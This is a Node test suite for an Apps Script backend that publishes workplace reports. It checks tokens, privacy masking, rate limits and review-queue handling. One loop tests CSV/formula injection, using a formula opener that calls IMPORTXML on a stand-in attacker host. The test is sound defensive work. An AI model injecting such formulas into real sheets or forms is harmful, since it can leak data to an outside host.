// Runs google/Code.gs against an in-memory stand-in for Google's services.
// Usage: node --test tests/apps_script.test.js

const assert = require('node:assert');
const crypto = require('node:crypto');
const fs = require('node:fs');
const path = require('node:path');
const test = require('node:test');
const vm = require('node:vm');

const CODE = fs.readFileSync(path.join(__dirname, '..', 'google', 'Code.gs'), 'utf8');
const TOKEN = 'test-token';

class FakeSheet {
  constructor(name, rows) {
    this.name = name;
    this.rows = rows;
  }
  getName() { return this.name; }
  getLastRow() { return this.rows.length; }
  appendRow(row) { this.rows.push([...row]); }
  deleteRow(row) { this.rows.splice(row - 1, 1); }
  getDataRange() { return this.getRange(1, 1, this.rows.length, 3); }
  getRange(row, column, rowCount = 1, columnCount = 1) {
    const sheet = this;
    const range = {
      getSheet: () => sheet,
      getRow: () => row,
      getColumn: () => column,
      getLastRow: () => row + rowCount - 1,
      getLastColumn: () => column + columnCount - 1,
      getValue: () => (sheet.rows[row - 1] || [])[column - 1] ?? '',
      setValue(value) {
        sheet.rows[row - 1][column - 1] = value;
        return range;
      },
      getValues() {
        const values = [];
        for (let r = 0; r < rowCount; r++) {
          const source = sheet.rows[row - 1 + r] || [];
          const line = [];
          for (let c = 0; c < columnCount; c++) line.push(source[column - 1 + c] ?? '');
          values.push(line);
        }
        return values;
      },
      setValues(values) {
        values.forEach((line, r) => {
          sheet.rows[row - 1 + r] = sheet.rows[row - 1 + r] || [];
          line.forEach((value, c) => { sheet.rows[row - 1 + r][column - 1 + c] = value; });
        });
        return range;
      },
    };
    return range;
  }
}

function build(settings = {}) {
  const context = vm.createContext({ console, Date, JSON, String, Number, Math, Object });
  vm.runInContext(CODE, context);
  const columns = (name) => vm.runInContext(name, context);

  const tabs = {
    'Public Directory': new FakeSheet('Public Directory', [columns('PUBLIC_COLUMNS')]),
    Submissions: new FakeSheet('Submissions', [columns('SUBMISSION_COLUMNS')]),
    'Review Queue': new FakeSheet('Review Queue', [columns('QUEUE_COLUMNS')]),
    Corrections: new FakeSheet('Corrections', [columns('CORRECTION_COLUMNS')]),
    Removed: new FakeSheet('Removed', [columns('REMOVED_COLUMNS')]),
    'Legacy Archive': new FakeSheet('Legacy Archive', []),
    Settings: new FakeSheet('Settings', [
      ['setting', 'value', 'what it does'],
      ['auto_publish', settings.auto_publish ?? true, ''],
      ['max_live_per_hour', settings.max_live_per_hour ?? 20, ''],
    ]),
  };
  const properties = {
    PUBLIC_ID: 'public', PRIVATE_ID: 'private', SUBMIT_TOKEN: TOKEN, NEXT_ID: '1', ALLOW_SEED: 'true',
  };
  const cache = {};
  const mail = [];
  const book = { getSheetByName: (name) => tabs[name], getUrl: () => 'https://sheet.example' };

  Object.assign(context, {
    SpreadsheetApp: { openById: () => book },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (key) => properties[key] ?? null,
        setProperty: (key, value) => { properties[key] = value; },
        deleteProperty: (key) => { delete properties[key]; },
      }),
    },
    CacheService: {
      getScriptCache: () => ({
        get: (key) => cache[key] ?? null,
        put: (key, value) => { cache[key] = value; },
      }),
    },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    MailApp: { sendEmail: (to, subject, body) => mail.push({ to, subject, body }) },
    Session: { getEffectiveUser: () => ({ getEmail: () => 'admin@example.com' }) },
    Utilities: {
      formatDate: () => '2026110100',
      computeDigest: (algorithm, text) => crypto.createHash('sha256').update(text).digest(),
      base64Encode: (digest) => digest.toString('base64'),
      DigestAlgorithm: { SHA_256: 'sha256' },
    },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (text) => ({ text, setMimeType() { return this; } }),
    },
  });

  const post = (body) => {
    const output = context.doPost({ postData: { contents: JSON.stringify({ token: TOKEN, ...body }) } });
    return JSON.parse(output.text);
  };
  return { context, tabs, properties, mail, post, columns };
}

let counter = 0;
function submission(publicFields = {}, privateFields = {}) {
  counter += 1;
  return {
    kind: 'submission',
    nonce: `nonce-${counter}`,
    public: {
      employer_name: 'Acme Resort',
      state: 'Ohio',
      report_description: `Hours were cut, report number ${counter}.`,
      submission_type: 'report',
      verification_status: 'community_reported',
      ...publicFields,
    },
    private: { contact: 'reporter@example.com', ...privateFields },
  };
}

function setStatus(app, id, status) {
  const queue = app.tabs['Review Queue'];
  const column = app.columns('QUEUE_COLUMNS').indexOf('review_status') + 1;
  const row = queue.rows.findIndex((line) => line[0] === id) + 1;
  queue.rows[row - 1][column - 1] = status;
  app.context.onReviewEdit({ range: queue.getRange(row, column) });
}

function publicIds(app) {
  return app.tabs['Public Directory'].rows.slice(1).map((row) => row[0]);
}

test('a wrong token is refused and nothing is written', () => {
  const app = build();
  const reply = app.post({ ...submission(), token: 'wrong' });
  assert.strictEqual(reply.ok, false);
  assert.strictEqual(app.tabs.Submissions.rows.length, 1);
});

test('unreadable requests are refused', () => {
  const app = build();
  const output = app.context.doPost({ postData: { contents: 'not json' } });
  assert.strictEqual(JSON.parse(output.text).ok, false);
});

test('ping confirms the service without writing', () => {
  const app = build();
  assert.strictEqual(app.post({ kind: 'ping' }).ok, true);
  assert.strictEqual(app.tabs.Submissions.rows.length, 1);
});

test('a submission goes live and is recorded privately', () => {
  const app = build();
  const reply = app.post(submission());
  assert.deepStrictEqual([reply.ok, reply.status, reply.record_id], [true, 'Live', 'S-0001']);
  assert.deepStrictEqual(publicIds(app), ['S-0001']);
  assert.strictEqual(app.tabs.Submissions.rows.length, 2);
  assert.strictEqual(app.tabs['Review Queue'].rows[1][4], 'Live');
});

test('contact details never reach the public tab', () => {
  const app = build();
  app.post(submission());
  assert.ok(!JSON.stringify(app.tabs['Public Directory'].rows).includes('reporter@example.com'));
  assert.ok(JSON.stringify(app.tabs.Submissions.rows).includes('reporter@example.com'));
});

test('extra fields are dropped before the public tab', () => {
  const app = build();
  app.post(submission({ reviewer_notes: 'secret note', contact: 'x@example.com' }));
  assert.ok(!JSON.stringify(app.tabs['Public Directory'].rows).includes('secret note'));
});

test('a submission cannot claim to be verified', () => {
  const app = build();
  app.post(submission({ verification_status: 'verified', review_state: 'reviewed' }));
  const header = app.columns('PUBLIC_COLUMNS');
  const row = app.tabs['Public Directory'].rows[1];
  assert.strictEqual(row[header.indexOf('verification_status')], 'unverified');
  assert.strictEqual(row[header.indexOf('review_state')], 'unreviewed');
});

test('phone numbers and emails are masked in public text', () => {
  const app = build();
  app.post(submission({ report_description: 'Call 876-555-1234 or boss@example.com for $12.50' }));
  const header = app.columns('PUBLIC_COLUMNS');
  const text = app.tabs['Public Directory'].rows[1][header.indexOf('report_description')];
  assert.strictEqual(text, 'Call [number removed] or [email removed] for $12.50');
});

test('dates are not mistaken for phone numbers', () => {
  const app = build();
  app.post(submission({ date_reported: '2026-11-01', last_updated: '2026-11-01' }));
  const header = app.columns('PUBLIC_COLUMNS');
  const row = app.tabs['Public Directory'].rows[1];
  assert.strictEqual(row[header.indexOf('date_reported')], '2026-11-01');
  assert.strictEqual(row[header.indexOf('last_updated')], '2026-11-01');
});

for (const opener of ['=IMPORTXML("http://evil.example","//a")', '+1+1', '-1+1', '@SUM(1)']) {
  test(`formula text is stored as plain text: ${opener}`, () => {
    const app = build();
    app.post(submission({ employer_name: opener, report_description: opener }));
    const row = app.tabs['Public Directory'].rows[1];
    assert.ok(!row.some((cell) => typeof cell === 'string' && /^[=+\-@]/.test(cell)));
    const queue = app.tabs['Review Queue'].rows[1];
    assert.ok(!queue.some((cell) => typeof cell === 'string' && /^[=+\-@]/.test(cell)));
  });
}

test('a double tap only adds one record', () => {
  const app = build();
  const entry = submission();
  const first = app.post(entry);
  const second = app.post(entry);
  assert.strictEqual(first.record_id, second.record_id);
  assert.deepStrictEqual(publicIds(app), ['S-0001']);
});

test('an exact repeat is not published twice', () => {
  const app = build();
  const text = { report_description: 'The same words sent twice.' };
  app.post(submission(text));
  app.post(submission(text));
  assert.strictEqual(publicIds(app).length, 1);
});

test('reports past the hourly limit are held, not published', () => {
  const app = build({ max_live_per_hour: 2 });
  const replies = [1, 2, 3].map(() => app.post(submission()));
  assert.deepStrictEqual(replies.map((r) => r.status), ['Live', 'Live', 'Held']);
  assert.strictEqual(publicIds(app).length, 2);
  assert.strictEqual(app.tabs.Submissions.rows.length, 4);
});

test('the pause switch holds new reports', () => {
  const app = build({ auto_publish: false });
  assert.strictEqual(app.post(submission()).status, 'Held');
  assert.deepStrictEqual(publicIds(app), []);
});

test('the pause switch works when the sheet stores FALSE as text', () => {
  const app = build({ auto_publish: 'FALSE' });
  assert.strictEqual(app.post(submission()).status, 'Held');
});

test('each new report emails the admin', () => {
  const app = build();
  app.post(submission());
  assert.strictEqual(app.mail.length, 1);
  assert.ok(app.mail[0].subject.startsWith('New report'));
});

test('serious words are flagged priority but still published', () => {
  const app = build();
  const reply = app.post(submission({ report_description: 'I think this was trafficking.' }));
  assert.strictEqual(reply.status, 'Live');
  assert.ok(app.mail[0].subject.startsWith('PRIORITY'));
  assert.strictEqual(app.tabs['Review Queue'].rows[1][5], 'yes');
});

test('an email failure does not lose the report', () => {
  const app = build();
  app.context.MailApp = { sendEmail() { throw new Error('quota'); } };
  assert.strictEqual(app.post(submission()).ok, true);
  assert.strictEqual(publicIds(app).length, 1);
});

test('Removed takes a record off the public tab and keeps a copy', () => {
  const app = build();
  app.post(submission());
  setStatus(app, 'S-0001', 'Removed');
  assert.deepStrictEqual(publicIds(app), []);
  assert.strictEqual(app.tabs.Removed.rows[1][0], 'S-0001');
});

test('a removed record can be put back', () => {
  const app = build();
  app.post(submission());
  setStatus(app, 'S-0001', 'Removed');
  setStatus(app, 'S-0001', 'Live');
  assert.deepStrictEqual(publicIds(app), ['S-0001']);
  assert.strictEqual(app.tabs.Removed.rows.length, 1);
});

test('Reviewed clears the review note', () => {
  const app = build();
  app.post(submission());
  setStatus(app, 'S-0001', 'Reviewed');
  const header = app.columns('PUBLIC_COLUMNS');
  assert.strictEqual(app.tabs['Public Directory'].rows[1][header.indexOf('review_state')], 'reviewed');
});

test('a report held by the limit can be released', () => {
  const app = build({ auto_publish: false });
  app.post(submission());
  setStatus(app, 'S-0001', 'Live');
  assert.deepStrictEqual(publicIds(app), ['S-0001']);
  const row = app.tabs['Public Directory'].rows[1];
  assert.ok(!JSON.stringify(row).includes('reporter@example.com'));
});

test('removing a record twice is harmless', () => {
  const app = build();
  app.post(submission());
  setStatus(app, 'S-0001', 'Removed');
  setStatus(app, 'S-0001', 'Removed');
  assert.strictEqual(app.tabs.Removed.rows.length, 2);
});

test('edits to other columns do nothing', () => {
  const app = build();
  app.post(submission());
  const queue = app.tabs['Review Queue'];
  queue.rows[1][4] = 'Removed';
  app.context.onReviewEdit({ range: queue.getRange(2, 9) });
  assert.deepStrictEqual(publicIds(app), ['S-0001']);
});

test('edits to other tabs do nothing', () => {
  const app = build();
  app.post(submission());
  app.context.onReviewEdit({ range: app.tabs.Corrections.getRange(2, 5) });
  assert.deepStrictEqual(publicIds(app), ['S-0001']);
});

test('pasting several statuses applies them all', () => {
  const app = build();
  app.post(submission());
  app.post(submission());
  const queue = app.tabs['Review Queue'];
  queue.rows[1][4] = 'Removed';
  queue.rows[2][4] = 'Removed';
  app.context.onReviewEdit({ range: queue.getRange(2, 5, 2, 1) });
  assert.deepStrictEqual(publicIds(app), []);
});

test('corrections stay private and alert the admin', () => {
  const app = build();
  const reply = app.post({
    kind: 'correction',
    private: { record_id: 'L-0001', problem: 'This is wrong', contact: 'owner@example.com' },
  });
  assert.strictEqual(reply.ok, true);
  assert.strictEqual(app.tabs.Corrections.rows.length, 2);
  assert.ok(!JSON.stringify(app.tabs['Public Directory'].rows).includes('owner@example.com'));
  assert.ok(app.mail[0].subject.includes('L-0001'));
});

test('the seed loads once and then closes', () => {
  const app = build();
  const seed = { kind: 'seed', public: [['L-0001']], queue: [['L-0001']], archive: [['source_row'], ['2']] };
  assert.strictEqual(app.post(seed).ok, true);
  assert.deepStrictEqual(publicIds(app), ['L-0001']);
  assert.strictEqual(app.post(seed).ok, false);
  assert.strictEqual(publicIds(app).length, 1);
});
